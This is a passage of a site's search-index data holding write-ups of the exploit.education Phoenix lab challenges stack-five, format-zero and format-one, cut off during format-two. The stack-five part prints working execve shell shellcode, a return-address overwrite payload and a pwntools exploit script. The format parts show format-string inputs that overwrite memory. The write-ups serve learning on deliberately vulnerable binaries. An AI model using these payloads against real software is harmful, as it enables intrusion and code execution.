of assembler dump.   main() calls start_level()   Disassembling start_level(),   pwndbg&gt; disassemble start_level Dump of assembler code for function start_level:    0x000000000040058d &lt;+0&gt;:\t  push   rbp    0x000000000040058e &lt;+1&gt;:\t  mov    rbp,rsp    0x0000000000400591 &lt;+4&gt;:\t  add    rsp,0xffffffffffffff80    0x0000000000400595 &lt;+8&gt;:\t  lea    rax,[rbp-0x80]    0x0000000000400599 &lt;+12&gt;:\tmov    rdi,rax    0x000000000040059c &lt;+15&gt;:\tcall   0x4003f0 &lt;gets@plt&gt;    0x00000000004005a1 &lt;+20&gt;:\tnop    0x00000000004005a2 &lt;+21&gt;:\tleave    0x00000000004005a3 &lt;+22&gt;:\tret End of assembler dump.   Lets take a look at the source code of this binary for proper understanding,   #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *);  void start_level() {   char buffer[128];   gets(buffer); }  int main(int argc, char **argv) {   printf(\"%s\\n\", BANNER);   start_level(); }   In HINT they have mentioned that this challenge is something related to “shellcode”   Our aim on this challenge is to execute our shellcode in stack and pop a shell   Important things to note in this binary are,     char buffer[128];   gets(buffer);   Our buffer is large enough to accomodate our shellcode   gets() is used, so we can use this as our advantage to perform an overflow attack   First lets try to crash this binary,   user@phoenix-amd64:~$ python -c \"print('A'*100)\"|./stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education user@phoenix-amd64:~$ python -c \"print('A'*128)\"|./stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education Segmentation fault user@phoenix-amd64:~$ python -c \"print('A'*150)\"|./stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education Segmentation fault   So we are able to crash our binary   We will analyse it further in our debugger   Inorder to pass a shellcode and execute it successfully, we must point our $rip return address correctly to the address where shellcode is placed   Here we will be passing shellcode into our buffer   So we need to know the starting address of the buffer      0x0000000000400595 &lt;+8&gt;:\t  lea    rax,[rbp-0x80]    0x0000000000400599 &lt;+12&gt;:\tmov    rdi,rax    0x000000000040059c &lt;+15&gt;:\tcall   0x4003f0 &lt;gets@plt&gt;   Since gets() is used to store the data inside buffer, we can use break point to analyse the value of rbp-0x80 which is the starting address of buffer   Setting breakpoint,   (gdb) disassemble start_level Dump of assembler code for function start_level:    0x000000000040058d &lt;+0&gt;:\t  push   rbp    0x000000000040058e &lt;+1&gt;:\t  mov    rbp,rsp    0x0000000000400591 &lt;+4&gt;:\t  add    rsp,0xffffffffffffff80    0x0000000000400595 &lt;+8&gt;:\t  lea    rax,[rbp-0x80]    0x0000000000400599 &lt;+12&gt;:\tmov    rdi,rax    0x000000000040059c &lt;+15&gt;:\tcall   0x4003f0 &lt;gets@plt&gt;    0x00000000004005a1 &lt;+20&gt;:\tnop    0x00000000004005a2 &lt;+21&gt;:\tleave    0x00000000004005a3 &lt;+22&gt;:\tret End of assembler dump. gdb) b *0x000000000040059c Breakpoint 1 at 0x40059c   Now run and find the address,   (gdb) r Starting program: /home/user/stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education  Breakpoint 1, 0x000000000040059c in start_level ()  ....  (gdb) print $rbp-0x80 $1 = (void *) 0x7fffffffe5d0   So the starting address of our buffer is 0x7fffffffe5d0   To pop a shell, we will be using the 27 bytes shellcode below,   \\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05   Lets exploit the binary now,   payload = junk(nops) + shellcode + junk + base pointer + return address   Here “nops” is referred as “No Operation” , and it is given by \\x90   After our buffer we need to fill our Base Pointer (8 bytes) to reach our $rip   In $rip we will be filling it with 0x7fffffffe5d0,the starting address of our buffer   Fuzzing it,   user@phoenix-amd64:~$ python -c \"print('A'*128+'B'*8+'C'*6)\" AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC user@phoenix-amd64:~$ python -c \"print('A'*128+'B'*8+'C'*6)\" &gt; fuzz user@phoenix-amd64:~$ cat fuzz AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC  In debugger,  (gdb) r &lt; fuzz Starting program: /home/user/stack-five &lt; fuzz Welcome to phoenix/stack-five, brought to you by https://exploit.education  Program received signal SIGSEGV, Segmentation fault. 0x0000434343434343 in ?? ()  gdb) info registers rip rip            0x434343434343      0x434343434343   So we can overwrite the $rip correctly   Crafting the payload,   user@phoenix-amd64:~$ python -c \"print('\\x90'*30+'\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'+'\\x90'*(128-30-27)+'B'*8+'\\xd0\\xe5\\xff\\xff\\xff\\x7f')\" 1HѝЌH�T_RWT^;BBBBBBBB0� user@phoenix-amd64:~$ python -c \"print('\\x90'*30+'\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'+'\\x90'*(128-30-27)+'B'*8+'\\xd0\\xe5\\xff\\xff\\xff\\x7f')\" &gt; exploit   Testing it in debugger,   (gdb) r &lt;exploit Starting program: /home/user/stack-five &lt;exploit Welcome to phoenix/stack-five, brought to you by https://exploit.education process 9904 is executing new program: /bin/dash warning: Could not load shared library symbols for linux-vdso.so.1. Do you need \"set solib-search-path\" or \"set sysroot\"? [Inferior 1 (process 9904) exited normally]   Exploit in python,   user@phoenix-amd64:~$ cd /tmp/ user@phoenix-amd64:/tmp$ cat exploit.py from pwn import * rip=\"\\xd0\\xe5\\xff\\xff\\xff\\x7f\" #rip=p64(0x7fffffffe5d0) bp=\"B\"*8 shellcode=\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" nops=\"\\x90\" payload=\"\" payload+=nops*32 payload+=shellcode payload+=\"A\"*(128-len(payload)) payload+=bp payload+=rip print(payload)   Lets run our exploit,   user@phoenix-amd64:~$ (python /tmp/exploit.py;cat) | /opt/phoenix/amd64/stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education id uid=1000(user) gid=1000(user) euid=405(phoenix-amd64-stack-five) egid=405(phoenix-amd64-stack-five) groups=405(phoenix-amd64-stack-five),27(sudo),1000(user) whoami phoenix-amd64-stack-five ls format-zero ls -la total 52 drwxr-xr-x 4 user user 4096 Jun 11 06:37 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw------- 1 user user 9349 Jun 11 06:33 .bash_history -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw------- 1 user user  389 Jun 11 06:37 .gdb_history drwxr-xr-x 2 user user 4096 Jun 11 05:40 .nano -rw-r--r-- 1 user user  675 Jan 13  2019 .profile drwxr-xr-x 2 user user 4096 Jun 11 05:42 .pwntools-cache -rwxr-xr-x 1 user user 6376 Jun 11 05:22 format-zero   Done! We have completed our “stack-five” challenge   ","categories": ["Binary Exploitation"],
        "tags": ["buffer overflow"],
        "url": "http://localhost:4000/binary%20exploitation/1-stack5/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      },{
        "title": "phoenix - format 0",
        "excerpt":"Lets list our files using la -la,   user@phoenix-amd64:~$ ls -la total 36 drwxr-xr-x 2 user user 4096 Jun 11 05:23 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw------- 1 user user 7376 Jun  6 09:53 .bash_history -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 6376 Jun 11 05:22 format-zero   Lets analyze the file type of the binary using file,   user@phoenix-amd64:~$ file format-zero format-zero: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   So this is a not stripped binary   Lets try running this,   user@phoenix-amd64:~$ ./format-zero Welcome to phoenix/format-zero, brought to you by https://exploit.education monish Uh oh, 'changeme' has not yet been changed. Would you like to try again?   Lets view the source code for proper understanding,   #include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   struct {     char dest[32];     volatile int changeme;   } locals;   char buffer[16];    printf(\"%s\\n\", BANNER);    if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {     errx(1, \"Unable to get buffer\");   }   buffer[15] = 0;    locals.changeme = 0;    sprintf(locals.dest, buffer);    if (locals.changeme != 0) {     puts(\"Well done, the 'changeme' variable has been changed!\");   } else {     puts(         \"Uh oh, 'changeme' has not yet been changed. Would you like to try \"         \"again?\");   }    exit(0); }   Here from the title we can guess this challenge is related to “FORMAT STRING VULNERABILTY”   Here we have a struct with following variables,       char dest[32];     volatile int changeme;   Our aim is to overwrite the changeme variable   Format String vulnerabilities occur when printf family functions tries to print their data without any format specifiers.This leads to popping of random values from stack and displaying it to the user   Our dest has 32 bytes   So we have to send more than 32bytes to overflow the  changeme variable   And we have a variable buffer for 16 bytes   if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {     errx(1, \"Unable to get buffer\");   }   buffer[15] = 0;   Here fgets is used to get the data properly and null byte termination is done by buffer[15] = 0   To overwrite changeme variable we need to pass more than 32 bytes   But we cannot pass it into buffer of 16 bytes   Here comes the format string vulnerability   Lets pass %x and %p (use your formats if needed) to store the address values into the dest variable   Passing format strings like %s can cause segmentation fault if there is no string in the corresponding memory   Disassembling main() function,   (gdb) disassemble main Dump of assembler code for function main:    0x000000000040069d &lt;+0&gt;:\tpush   rbp    0x000000000040069e &lt;+1&gt;:\tmov    rbp,rsp    0x00000000004006a1 &lt;+4&gt;:\tsub    rsp,0x50    0x00000000004006a5 &lt;+8&gt;:\tmov    DWORD PTR [rbp-0x44],edi    0x00000000004006a8 &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x50],rsi    0x00000000004006ac &lt;+15&gt;:\tmov    edi,0x400790    0x00000000004006b1 &lt;+20&gt;:\tcall   0x4004e0 &lt;puts@plt&gt;    0x00000000004006b6 &lt;+25&gt;:\tmov    rdx,QWORD PTR [rip+0x200423]        # 0x600ae0 &lt;stdin&gt;    0x00000000004006bd &lt;+32&gt;:\tlea    rax,[rbp-0x40]    0x00000000004006c1 &lt;+36&gt;:\tmov    esi,0xf    0x00000000004006c6 &lt;+41&gt;:\tmov    rdi,rax    0x00000000004006c9 &lt;+44&gt;:\tcall   0x4004d0 &lt;fgets@plt&gt;    0x00000000004006ce &lt;+49&gt;:\ttest   rax,rax    0x00000000004006d1 &lt;+52&gt;:\tjne    0x4006e7 &lt;main+74&gt;    0x00000000004006d3 &lt;+54&gt;:\tmov    esi,0x4007dc    0x00000000004006d8 &lt;+59&gt;:\tmov    edi,0x1    0x00000000004006dd &lt;+64&gt;:\tmov    eax,0x0    0x00000000004006e2 &lt;+69&gt;:\tcall   0x4004f0 &lt;errx@plt&gt;    0x00000000004006e7 &lt;+74&gt;:\tmov    BYTE PTR [rbp-0x31],0x0    0x00000000004006eb &lt;+78&gt;:\tmov    DWORD PTR [rbp-0x10],0x0    0x00000000004006f2 &lt;+85&gt;:\tlea    rdx,[rbp-0x40]    0x00000000004006f6 &lt;+89&gt;:\tlea    rax,[rbp-0x30]    0x00000000004006fa &lt;+93&gt;:\tmov    rsi,rdx    0x00000000004006fd &lt;+96&gt;:\tmov    rdi,rax    0x0000000000400700 &lt;+99&gt;:\tmov    eax,0x0    0x0000000000400705 &lt;+104&gt;:\tcall   0x400500 &lt;sprintf@plt&gt;    0x000000000040070a &lt;+109&gt;:\tmov    eax,DWORD PTR [rbp-0x10]    0x000000000040070d &lt;+112&gt;:\ttest   eax,eax    0x000000000040070f &lt;+114&gt;:\tje     0x40071d &lt;main+128&gt;    0x0000000000400711 &lt;+116&gt;:\tmov    edi,0x4007f8    0x0000000000400716 &lt;+121&gt;:\tcall   0x4004e0 &lt;puts@plt&gt;    0x000000000040071b &lt;+126&gt;:\tjmp    0x400727 &lt;main+138&gt;    0x000000000040071d &lt;+128&gt;:\tmov    edi,0x400830    0x0000000000400722 &lt;+133&gt;:\tcall   0x4004e0 &lt;puts@plt&gt;    0x0000000000400727 &lt;+138&gt;:\tmov    edi,0x0    0x000000000040072c &lt;+143&gt;:\tcall   0x400510 &lt;exit@plt&gt; End of assembler dump.   changeme variable is in $rbp-0x10   Setting break points to analyze,   (gdb) b *0x000000000040070a Breakpoint 1 at 0x40070a  (gdb) r Starting program: /home/user/format-zero Welcome to phoenix/format-zero, brought to you by https://exploit.education AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ  Breakpoint 1, 0x000000000040070a in main () [ Legend: Modified register | Code | Heap | Stack | String ] ───────────────────────────────────────────────────────────────────────────────────── registers ──── $rax   : 0xe $rbx   : 0x00007fffffffe6b8  →  0x00007fffffffe8be  →  \"/home/user/format-zero\" $rcx   : 0x0 $rdx   : 0xffffffff $rsp   : 0x00007fffffffe610  →  0x00007fffffffe6b8  →  0x00007fffffffe8be  →  \"/home/user/format-zero\" $rbp   : 0x00007fffffffe660  →  0x0000000000000001 $rsi   : 0x00007fffffffe2fe  →  0x0000000000900000 $rdi   : 0x00007fffffffe63e  →  0x0000000000010000 $rip   : 0x000000000040070a  →  &lt;main+109&gt; mov eax, DWORD PTR [rbp-0x10] $r8    : 0x00007fffffffe2c8  →  0x0000000000000000 $r9    : 0x00007fffffffe620  →  \"AAAABBBBCCCCDD\" $r10   : 0x8080808080808080 $r11   : 0x1 $r12   : 0x00007fffffffe6c8  →  0x00007fffffffe8d5  →  \"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]\" $r13   : 0x000000000040069d  →  &lt;main+0&gt; push rbp $r14   : 0x0 $r15   : 0x0 $eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 ───────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffe610│+0x0000: 0x00007fffffffe6b8  →  0x00007fffffffe8be  →  \"/home/user/format-zero\"\t← $rsp 0x00007fffffffe618│+0x0008: 0x0000000100000000 0x00007fffffffe620│+0x0010: \"AAAABBBBCCCCDD\"\t ← $r9 0x00007fffffffe628│+0x0018: 0x0000444443434343 (\"CCCCDD\"?) 0x00007fffffffe630│+0x0020: \"AAAABBBBCCCCDD\" 0x00007fffffffe638│+0x0028: 0x0000444443434343 (\"CCCCDD\"?) 0x00007fffffffe640│+0x0030: 0x0000000000000001 0x00007fffffffe648│+0x0038: 0x00007fffffffe6c8  →  0x00007fffffffe8d5  →  \"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]\" ─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────      0x4006fd &lt;main+96&gt;        mov    rdi, rax      0x400700 &lt;main+99&gt;        mov    eax, 0x0      0x400705 &lt;main+104&gt;       call   0x400500 &lt;sprintf@plt&gt;  →   0x40070a &lt;main+109&gt;       mov    eax, DWORD PTR [rbp-0x10]      0x40070d &lt;main+112&gt;       test   eax, eax      0x40070f &lt;main+114&gt;       je     0x40071d &lt;main+128&gt;      0x400711 &lt;main+116&gt;       mov    edi, 0x4007f8      0x400716 &lt;main+121&gt;       call   0x4004e0 &lt;puts@plt&gt;      0x40071b &lt;main+126&gt;       jmp    0x400727 &lt;main+138&gt; ─────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"format-zero\", stopped, reason: BREAKPOINT ───────────────────────────────────────────────────────────────────────────────────────── trace ──── [#0] 0x40070a → main() ────────────────────────────────────────────────────────────────────────────────────────────────────  (gdb) print $rbp-0x10 $1 = (void *) 0x7fffffffe650  (gdb) x/s $rbp-0x10 0x7fffffffe650:\t\"\"  (gdb)   Clearly we can say that our data from buffer did not place into dest to overwrite our changeme   Lets try passing some format strings in it,   (gdb) r Starting program: /home/user/format-zero Welcome to phoenix/format-zero, brought to you by https://exploit.education %p%p%p  Breakpoint 1, 0x000000000040070a in main ()  (gdb) x/s $rbp-0x10 0x7fffffffe650:\t\"fff7ffb300\\n\"    changeme is overwritten   So %p stores address of 14 bytes in dest   3 %p gives more than 32bytes so that we could overwrite the changeme   Lets try this input on our binary,   %p will pop 3 values from stack of 14*3 bytes which is enough for us   user@phoenix-amd64:~$ ./format-zero Welcome to phoenix/format-zero, brought to you by https://exploit.education %p%p%p Well done, the 'changeme' variable has been changed!   Done! we have completed “format-zero”  ","categories": ["Binary Exploitation"],
        "tags": ["format string"],
        "url": "http://localhost:4000/binary%20exploitation/2-format0/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      },{
        "title": "phoenix - format 1",
        "excerpt":"Lets list the files using ls -la,   user@phoenix-amd64:~$ ls -la total 28 drwxr-xr-x 2 user user 4096 Jun 11 07:20 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 6472 Jun 11 07:20 format-one   Lets check the file type of the binary using file command,   user@phoenix-amd64:~$ file format-one format-one: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   So this binary is a not stripped binary   Lets try running it,   user@phoenix-amd64:~$ ./format-one Welcome to phoenix/format-one, brought to you by https://exploit.education monish Uh oh, 'changeme' is not the magic value, it is 0x00000000   It seems like we have to store some address in changeme   Disassembling main(),   (gdb) disas main Dump of assembler code for function main:    0x00000000004006ed &lt;+0&gt;:\tpush   rbp    0x00000000004006ee &lt;+1&gt;:\tmov    rbp,rsp    0x00000000004006f1 &lt;+4&gt;:\tsub    rsp,0x50    0x00000000004006f5 &lt;+8&gt;:\tmov    DWORD PTR [rbp-0x44],edi    0x00000000004006f8 &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x50],rsi    0x00000000004006fc &lt;+15&gt;:\tmov    edi,0x4007e0    0x0000000000400701 &lt;+20&gt;:\tcall   0x400530 &lt;puts@plt&gt;    0x0000000000400706 &lt;+25&gt;:\tmov    rdx,QWORD PTR [rip+0x200433]        # 0x600b40 &lt;stdin&gt;    0x000000000040070d &lt;+32&gt;:\tlea    rax,[rbp-0x40]    0x0000000000400711 &lt;+36&gt;:\tmov    esi,0xf    0x0000000000400716 &lt;+41&gt;:\tmov    rdi,rax    0x0000000000400719 &lt;+44&gt;:\tcall   0x400520 &lt;fgets@plt&gt;    0x000000000040071e &lt;+49&gt;:\ttest   rax,rax    0x0000000000400721 &lt;+52&gt;:\tjne    0x400737 &lt;main+74&gt;    0x0000000000400723 &lt;+54&gt;:\tmov    esi,0x40082b    0x0000000000400728 &lt;+59&gt;:\tmov    edi,0x1    0x000000000040072d &lt;+64&gt;:\tmov    eax,0x0    0x0000000000400732 &lt;+69&gt;:\tcall   0x400540 &lt;errx@plt&gt;    0x0000000000400737 &lt;+74&gt;:\tmov    BYTE PTR [rbp-0x31],0x0    0x000000000040073b &lt;+78&gt;:\tmov    DWORD PTR [rbp-0x10],0x0    0x0000000000400742 &lt;+85&gt;:\tlea    rdx,[rbp-0x40]    0x0000000000400746 &lt;+89&gt;:\tlea    rax,[rbp-0x30]    0x000000000040074a &lt;+93&gt;:\tmov    rsi,rdx    0x000000000040074d &lt;+96&gt;:\tmov    rdi,rax    0x0000000000400750 &lt;+99&gt;:\tmov    eax,0x0    0x0000000000400755 &lt;+104&gt;:\tcall   0x400550 &lt;sprintf@plt&gt;    0x000000000040075a &lt;+109&gt;:\tmov    eax,DWORD PTR [rbp-0x10]    0x000000000040075d &lt;+112&gt;:\tcmp    eax,0x45764f6c    0x0000000000400762 &lt;+117&gt;:\tje     0x40077a &lt;main+141&gt;    0x0000000000400764 &lt;+119&gt;:\tmov    eax,DWORD PTR [rbp-0x10]    0x0000000000400767 &lt;+122&gt;:\tmov    esi,eax    0x0000000000400769 &lt;+124&gt;:\tmov    edi,0x400840    0x000000000040076e &lt;+129&gt;:\tmov    eax,0x0    0x0000000000400773 &lt;+134&gt;:\tcall   0x400510 &lt;printf@plt&gt;    0x0000000000400778 &lt;+139&gt;:\tjmp    0x400784 &lt;main+151&gt;    0x000000000040077a &lt;+141&gt;:\tmov    edi,0x400878    0x000000000040077f &lt;+146&gt;:\tcall   0x400530 &lt;puts@plt&gt;    0x0000000000400784 &lt;+151&gt;:\tmov    edi,0x0    0x0000000000400789 &lt;+156&gt;:\tcall   0x400560 &lt;exit@plt&gt; End of assembler dump.   The compare instruction in this function is,      0x000000000040075d &lt;+112&gt;:\tcmp    eax,0x45764f6c   So the changeme value is being compared with 0x45764f6c   changeme is stored at $rbp-0x10   Lets view the source code for proper understanding,   #include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   struct {     char dest[32];     volatile int changeme;   } locals;   char buffer[16];    printf(\"%s\\n\", BANNER);    if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {     errx(1, \"Unable to get buffer\");   }   buffer[15] = 0;    locals.changeme = 0;    sprintf(locals.dest, buffer);    if (locals.changeme != 0x45764f6c) {     printf(\"Uh oh, 'changeme' is not the magic value, it is 0x%08x\\n\",         locals.changeme);   } else {     puts(\"Well done, the 'changeme' variable has been changed correctly!\");   }    exit(0); }   This challenge is same like before, but the key of the program lies in the below condition   if (locals.changeme != 0x45764f6c) {     printf(\"Uh oh, 'changeme' is not the magic value, it is 0x%08x\\n\",         locals.changeme);   } else {     puts(\"Well done, the 'changeme' variable has been changed correctly!\");   }   We have to pass 32 bytes in dest to reach changeme   Data for dest comes for buffer which is 16 bytes   So lets use format string vulnerability here,   To control the buffer space better, lets use %x (hex)   If we pass %32x it pops 32 hex values from stack   Similarly,   (gdb)  b *0x000000000040075a Breakpoint 1 at 0x40075a  (gdb) r Starting program: /home/user/format-one Welcome to phoenix/format-one, brought to you by https://exploit.education %32xABCD  Breakpoint 1, 0x000000000040075a in main ()  (gdb) x/s $rbp-0x10 0x7fffffffe660:\t\"ABCD\\n\"  (gdb)   So we have successfully overflowed the changeme with our input   Lets try exploiting this binary,   user@phoenix-amd64:~$ python -c \"print '%32x'+'\\x6c\\x4f\\x76\\x45'\" %32xlOvE user@phoenix-amd64:~$ python -c \"print '%32x'+'\\x6c\\x4f\\x76\\x45'\" | ./format-one Welcome to phoenix/format-one, brought to you by https://exploit.education Well done, the 'changeme' variable has been changed correctly!   Done! We have completed “format-one”  ","categories": ["Binary Exploitation"],
        "tags": ["format string"],
        "url": "http://localhost:4000/binary%20exploitation/3-format1/",
        "teaser": "http://localhost:4000/assets/images/binary-exploitation/binexp.png"
      },{
        "title": "phoenix - format 2",
        "excerpt":"Lets list the files using ls -la command,   user@phoenix-amd64:~$ ls -la total 28 drwxr-xr-x 2 user user 4096 Jun 11 07:40 . drwxr-xr-x 3 root root 4096 Jan 13  2019 .. -rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout -rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc -rw-r--r-- 1 user user  675 Jan 13  2019 .profile -rwxr-xr-x 1 user user 6224 Jun 11 07:40 format-two   Lets analyze the file type of our binary using file command,   user@phoenix-amd64:~$ file format-two format-two: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped   So our binary is a not stripped binary   Lets try running our binary,   user@phoenix-amd64:~$ ./format-two Welcome to phoenix/format-two, brought to you by https://exploit.education Better luck next time!  user@phoenix-amd64:~$ ./format-two monish Welcome to phoenix/format-two, brought to you by https://exploit.education monishBetter luck next time!    It seems like it is expecting some different input   Listing the functions inside the binary using GDB,   (gdb) info functions All defined functions:  Non-debugging symbols: 0x0000000000400480  _init 0x00000000004004a0  printf@plt 0x00000000004004b0  puts@plt 0x00000000004004c0  strncpy@plt 0x00000000004004d0  memset@plt 0x00000000004004e0  exit@plt 0x00000000004004f0  __libc_start_main@plt 0x0000000000400500  _start 0x0000000000400516  _start_c 0x0000000000400540  deregister_tm_clones 0x0000000000400570  register_tm_clones 0x00000000004005b0  __do_global_dtors_aux 0x0000000000400640  frame_dummy 0x000000000040066d  bounce 0x000000000040068d  main 0x0000000000400730  __do_global_ctors_aux 0x0000000000400772  _fini   There are two relevant functions, main() and bounce()   Disassembling main(),   (gdb) disas main Dump of assembler code for function main:    0x000000000040068d &lt;+0&gt;:\t    push   rbp    0x000000000040068e &lt;+1&gt;:\t    mov    rbp,rsp    0x0000000000400691 &lt;+4&gt;:\t    sub    rsp,0x110    0x0000000000400698 &lt;+11&gt;:\tmov    DWORD PTR [rbp-0x104],edi    0x000000000040069e &lt;+17&gt;:\tmov    QWORD PTR [rbp-0x110],rsi    0x00000000004006a5 &lt;+24&gt;:\tmov    edi,0x400780    0x00000000004006aa &lt;+29&gt;:\tcall   0x4004b0 &lt;puts@plt&gt;    0x00000000004006af &lt;+34&gt;:\tcmp    DWORD PTR [rbp-0x104],0x1    0x00000000004006b6 &lt;+41&gt;:\tjle    0x400705 &lt;main+120&gt;    0x00000000004006b8 &lt;+43&gt;:\tlea    rax,[rbp-0x100]    0x00000000004006bf &lt;+50&gt;:\tmov    edx,0x100    0x00000000004006c4 &lt;+55&gt;:\tmov    esi,0x0    0x00000000004006c9 &lt;+60&gt;:\tmov    rdi,rax    0x00000000004006cc &lt;+63&gt;:\tcall   0x4004d0 &lt;memset@plt&gt;    0x00000000004006d1 &lt;+68&gt;:\tmov    rax,QWORD PTR [rbp-0x110]    0x00000000004006d8 &lt;+75&gt;:\tadd    rax,0x8    0x00000000004006dc &lt;+79&gt;:\tmov    rcx,QWORD PTR [rax]    0x00000000004006df &lt;+82&gt;:\tlea    rax,[rbp-0x100]    0x00000000004006e6 &lt;+89&gt;:\tmov    edx,0x100    0x00000000004006eb &lt;+94&gt;:\tmov    rsi,rcx    0x00000000004006ee &lt;+97&gt;:\tmov    rdi,rax    0x00000000004006f1 &lt;+100&gt;:\tcall   0x4004c0 &lt;strncpy@plt&gt;    0x00000000004006f6 &lt;+105&gt;:\tlea    rax,[rbp-0x100]    0x00000000004006fd &lt;+112&gt;:\tmov    rdi,rax    0x0000000000400700 &lt;+115&gt;:\tcall   0x40066d &lt;bounce&gt;    0x0000000000400705 &lt;+120&gt;:\tmov    eax,DWORD PTR [rip+0x2003e5]        # 0x600af0 &lt;changeme&gt;    0x000000000040070b &lt;+126&gt;:\ttest   eax,eax    0x000000000040070d &lt;+128&gt;:\tje     0x40071b &lt;main+142&gt;    0x000000000040070f &lt;+130&gt;:\tmov    edi,0x4007d0    0x0000000000400714 &lt;+135&gt;:\tcall   0x4004b0 &lt;puts@plt&gt;    0x0000000000400719 &lt;+140&gt;:\tjmp    0x400725 &lt;main+152&gt;    0x000000000040071b &lt;+142&gt;:\tmov    edi,0x40080f    0x0000000000400720 &lt;+147&gt;:\tcall   0x4004b0 &lt;puts@plt&gt;    0x0000000000400725 &lt;+152&gt;:\tmov    edi,0x0    0x000000000040072a &lt;+157&gt;:\tcall   0x4004e0 &lt;exit@plt&gt; End of assembler dump.   Disassembling bounce(),   (gdb) disas bounce Dump of assembler code for function bounce:    0x000000000040066d &lt;+0&gt;:\t    push   rbp    0x000000000040066e &lt;+1&gt;:   \tmov    rbp,rsp    0x0000000000400671 &lt;+4&gt;:\t    sub    rsp,0x10    0x0000000000400675 &lt;+8&gt;:  \tmov    QWORD PTR [rbp-0x8],rdi    0x0000000000400679 &lt;+12&gt;:\tmov    rax,QWORD PTR [rbp-0x8]    0x000000000040067d &lt;+16&gt;:\tmov    rdi,rax    0x0000000000400680 &lt;+19&gt;:\tmov    eax,0x0    0x0000000000400685 &lt;+24&gt;:\tcall   0x4004a0 &lt;printf@plt&gt;    0x000000000040068a &lt;+29&gt;:\tnop    0x000000000040068b &lt;+30&gt;:\tleave    0x000000000040068c &lt;+31&gt;:\tret End of assembler dump.   Lets view the source code for proper understanding,   #include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int changeme;  void bounce(char 